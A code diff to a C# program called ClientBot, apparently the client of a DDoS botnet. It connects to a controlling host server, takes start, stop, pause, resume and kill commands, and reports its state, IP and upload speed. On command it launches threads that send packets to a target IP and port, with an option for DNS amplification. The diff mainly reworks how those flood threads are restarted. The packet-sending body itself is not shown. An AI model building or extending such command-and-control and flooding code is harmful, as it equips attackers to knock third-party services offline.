@@ -26,9 +26,11 @@ namespace ClientBot
         static List<Thread> threadList = new List<Thread>();
         static List<Task> taskList = new List<Task>();
         static bool kill = false;
+        static bool firstTime = true;
         static string[] a;
         static string[] command;
         static Thread listn;
+        static Thread sender;
         public static State clientState;
         IPv4InterfaceStatistics interfaceStats = null;
         [DllImport("Kernel32.dll")]
@@ -50,6 +52,7 @@ namespace ClientBot
                 Connect();
             }
         }
+        //Connect Method
         static void Connect()
         {
             
@@ -61,11 +64,6 @@ namespace ClientBot
                 listn = ListenThread;
                 threadList.Add(ListenThread);
                 ListenThread.Start();
-               // Thread readThread = new Thread(() => read());
-              //  threadList.Add(readThread);
-              //  readThread.Start();
-                
-                
             }
             catch(SocketException e)
             {
@@ -118,6 +116,8 @@ namespace ClientBot
                 
         //    }
         //}
+        //Listen Thread
+        //Listening function
         public static void L()
         {
             try
@@ -146,7 +146,6 @@ namespace ClientBot
                             clientState = State.CLIENT_STOP;
                             sendState(clientState);
                             Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandSTOP");
-                            L();
                         }
                     }
                     else if (ret.Equals(Command.PAUSE.ToString()))
@@ -167,7 +166,6 @@ namespace ClientBot
                             Console.WriteLine(getTime() + "Starting Listen");
                             sendState(clientState);
                             Console.WriteLine(getTime() + "CALLING LISSTEN FROM read function CommandStart");
-                            //Listen();
                         }
                     }
                     else if (ret.Equals(Command.RESUME.ToString()))
@@ -187,7 +185,12 @@ namespace ClientBot
                                 int sentData = int.Parse(command[2]);
                                 bool sentDNS = bool.Parse(command[3]);
                                 Console.WriteLine(getTime() + " sending " + command[0].ToString() + " " + command[1].ToString() + " " + command[2].ToString() + " " + command[3].ToString());
-                                Send(sentIP, sentPort, sentData, sentDNS);
+                            threadList.Remove(sender);
+                            sender.Abort();
+                            Thread sendz = new Thread(() => Send(sentIP, sentPort, sentData, sentDNS));
+                            sender = sendz;
+                            threadList.Add(sendz);
+                            sendz.Start();
                            
                         }
                     }
@@ -210,10 +213,26 @@ namespace ClientBot
                             setPreviousCommand(info);
                             sendSpeed();
                             clientState = State.CLIENT_SEND;
+                            sendState(clientState);
                             Console.WriteLine(getTime() + "sending now");
-                            Thread send = new Thread(()=>Send(sentIP, sentPort, sentData, dnsAMP));
-                            threadList.Add(send);
-                            send.Start();
+                            if (firstTime)
+                            {
+                                firstTime = false;
+                                Thread send = new Thread(() => Send(sentIP, sentPort, sentData, dnsAMP));
+                                sender = send;
+                                threadList.Add(send);
+                                send.Start();
+                            }
+                            else
+                            {
+                                threadList.Remove(sender);
+                                sender.Abort();
+                                Thread senda = new Thread(() => Send(sentIP, sentPort, sentData, dnsAMP));
+                                sender = senda;
+                                threadList.Add(senda);
+                                senda.Start();
+                                
+                            }
                         }
                         else
                         {
@@ -241,12 +260,11 @@ namespace ClientBot
                     
             });
         }
+        //function for sending packets to specified IP Address
         static void Send(IPAddress ip,int port, int dataAmount,bool dnsAMP)
         {
             Task.Run(() =>
             {
-
-                //L();
                 Task.WaitAll();
 
             });
@@ -452,27 +470,33 @@ namespace ClientBot
         //    }
         //    //    return ret;
         //}
+        //sends Client State to Host Server
         static async Task sendState(State state)
         {
             State currentState = state;
             NetworkStream stream = hostServer.GetStream();
             string statement = MessageType.STATE.ToString()+"$"+ getIP() + "$" + currentState.ToString();
             stream.Write(Encoding.ASCII.GetBytes(statement), 0, Encoding.ASCII.GetBytes(statement).Length);
+            Console.WriteLine(statement + " sent");
         }
+        //stores previous command sent by host
         static void setPreviousCommand(string[] a)
         {
 
             command = a; 
         }
+        //gets previous command sent by host
         static string[] getPreviousCommand()
         {
 
             return command;
         }
+        //will be used to send any information back to host
         static void write(string text)
         {
 
         }
+        //gets client ip
         static IPAddress getIP()
         {
             IPAddress ip;
@@ -489,6 +513,7 @@ namespace ClientBot
 
 
         }
+        // returns clients upload speed
         static double getSpeed()
         {
             double speed = 10;
@@ -525,12 +550,13 @@ namespace ClientBot
             speed = sp;
             return speed;
         }
-
+        // returns time for formatting
         public static string getTime()
         {
             string time = "["+DateTime.Now.ToString("hh:mm:ss")+"]: ";
             return time;
         }
+        //sends speed to host server
         static void sendSpeed()
         {
             NetworkStream stream = hostServer.GetStream();
@@ -539,13 +565,19 @@ namespace ClientBot
             string toSend = MessageType.SPEED.ToString()+"$"+ ip +"$"+ speed;
             stream.Write(Encoding.ASCII.GetBytes(toSend), 0, Encoding.ASCII.GetBytes(toSend).Length);
         }
+        //Kills all running threads and shuts down client
         static void KillApp()
         {
+            foreach(Thread s in threadList)
+            {
+                s.Abort();
+            }
             Environment.Exit(0);
         }
+        //closes all running threads except one thread for restart
         static void Restart()
         {
-            Console.WriteLine("Restar Called");
+            Console.WriteLine("Restart Called");
             hostServer = null;
             hostServer = new TcpClient();
             Console.WriteLine("ThreadList Length " + threadList.Count());
